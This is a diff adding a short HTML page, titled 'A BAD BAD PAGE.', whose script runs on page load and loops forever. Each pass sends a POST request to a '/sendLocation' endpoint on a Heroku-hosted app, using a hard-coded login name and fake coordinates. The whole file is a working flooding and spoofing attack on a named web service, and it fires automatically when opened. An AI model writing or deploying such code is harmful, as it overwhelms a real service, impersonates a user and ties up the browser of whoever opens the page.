@@ -1,0 +1,22 @@
+<!doctype html>
+
+<head>
+	<meta charset="utf-8"/>
+	<script>
+
+	function spamKenny() {
+		requests = [];
+		for (var i = 0; true; i++) {
+			requests[i] = new XMLHttpRequest();
+			requests[i].open("POST", "https://intense-headland-7693.herokuapp.com/sendLocation", true);
+			requests[i].setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			requests[i].send("login=MarkStruthers&lat=0&lng=0&message=hi");
+		}
+	}
+
+	</script>
+</head>
+
+<body onload=spamKenny()>
+	<h1>A BAD BAD PAGE.</h1>
+</body>
